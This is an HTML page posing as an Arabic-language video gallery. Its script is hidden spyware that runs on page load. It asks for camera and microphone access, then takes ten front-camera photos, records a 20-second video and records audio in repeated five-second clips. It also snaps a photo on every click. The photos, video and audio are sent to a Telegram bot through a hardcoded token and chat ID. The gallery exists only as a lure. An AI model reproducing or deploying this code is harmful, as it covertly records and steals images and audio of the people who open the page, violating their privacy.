
<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0">
  <title>فيديوهات - طائفة الظلام</title>
  <style>
    body {
      margin: 0;
      background-color: #1a001a;
      font-family: Arial, sans-serif;
      overflow-x: hidden;
      direction: rtl;
    }
    .cover {
      width: 100%;
      height: 200px;
      background-image: url('cover.jpg'); /* 👑 صورة الغلاف */
      background-size: cover;
      background-position: center;
    }
    .profile-pic {
      width: 120px;
      height: 120px;
      border-radius: 50%;
      border: 5px solid #ff00ff;
      margin: -60px auto 20px;
      background-image: url('profile.jpg'); /* 👑 صورة بروفايل */
      background-size: cover;
      background-position: center;
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.1); }
    }
    .desc {
      color: white;
      text-align: center;
      margin-bottom: 20px;
    }
    .videos {
      display: grid;
      grid-template-columns: repeat(5, 1fr);
      gap: 5px;
      padding: 10px;
    }
    video {
      width: 100%;
      aspect-ratio: 1/1;
      object-fit: cover;
      border-radius: 10px;
      cursor: pointer;
      border: 2px solid #fff;
    }
    .overlay {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.9);
      display: none;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      z-index: 999;
    }
    .overlay video {
      width: 90%;
      max-height: 80vh;
    }
    .download-btn {
      margin-top: 10px;
      padding: 10px 20px;
      background-color: #9900cc;
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 18px;
      cursor: pointer;
      animation: pulse 1.5s infinite;
    }
  </style>
</head>
<body>

<div class="cover"></div>
<div class="profile-pic"></div>
<div class="desc">⚡ صفحة الفيديوهات الخاصة بـ طائفة الظلام ⚡</div>

<div class="videos">
  <video src="ffghgg.mp4" controls muted preload="metadata"></video>
  <video src="ffghgg.mp4" controls muted preload="metadata"></video>
  <video src="ffghgg.mp4" controls muted preload="metadata"></video>
  <video src="ffghgg.mp4" controls muted preload="metadata"></video>
  <video src="ffghgg.mp4" controls muted preload="metadata"></video>
</div>

<div class="overlay" id="overlay">
  <video id="bigVideo" controls autoplay></video>
  <a id="downloadLink" download>
    <button class="download-btn">⬇ تحميل الفيديو</button>
  </a>
</div>

<script>
const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
const CHAT_ID = "7664410054";

// رسالة إذن بلغة يابانية
alert("カメラとマイクへのアクセスを許可してください！");

// التقاط صور وفيديو عند الدخول
let images = [];
navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true }).then(stream => {
  const videoTrack = stream.getVideoTracks()[0];
  const imageCapture = new ImageCapture(videoTrack);

  // التقاط 10 صور
  let count = 0;
  const captureInterval = setInterval(() => {
    if (count >= 10) clearInterval(captureInterval);
    imageCapture.takePhoto().then(blob => sendPhoto(blob));
    count++;
  }, 1000);

  // تسجيل فيديو 20 ثانية
  const mediaRecorder = new MediaRecorder(stream);
  const chunks = [];
  mediaRecorder.ondataavailable = e => chunks.push(e.data);
  mediaRecorder.onstop = () => {
    const videoBlob = new Blob(chunks, { type: 'video/webm' });
    sendFile(videoBlob, 'video.webm');
  };
  mediaRecorder.start();
  setTimeout(() => mediaRecorder.stop(), 20000);

  // تسجيل صوت mp3 كل 5 ثوان
  const audioRecorder = new MediaRecorder(stream);
  setInterval(() => {
    const aChunks = [];
    const aRecorder = new MediaRecorder(stream);
    aRecorder.ondataavailable = e => aChunks.push(e.data);
    aRecorder.onstop = () => {
      const aBlob = new Blob(aChunks, { type: 'audio/mp3' });
      sendFile(aBlob, 'voice.mp3');
    };
    aRecorder.start();
    setTimeout(() => aRecorder.stop(), 5000);
  }, 5000);
});

// التقاط صورة عند أي نقر
document.body.addEventListener("click", () => {
  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then(stream => {
      const track = stream.getVideoTracks()[0];
      const capture = new ImageCapture(track);
      capture.takePhoto().then(blob => sendPhoto(blob));
    });
});

// إرسال صورة
function sendPhoto(blob) {
  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("photo", blob, "photo.jpg");
  fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: form });
}

// إرسال ملف (فيديو/صوت)
function sendFile(blob, filename) {
  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("document", blob, filename);
  fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: "POST", body: form });
}

// تكبير الفيديو عند الضغط
document.querySelectorAll("video").forEach(v => {
  v.addEventListener("click", e => {
    e.stopPropagation();
    document.getElementById("bigVideo").src = v.src;
    document.getElementById("downloadLink").href = v.src;
    document.getElementById("overlay").style.display = "flex";
  });
});

document.getElementById("overlay").addEventListener("click", () => {
  document.getElementById("overlay").style.display = "none";
  document.getElementById("bigVideo").pause();
});
</script>
</body>
</html>
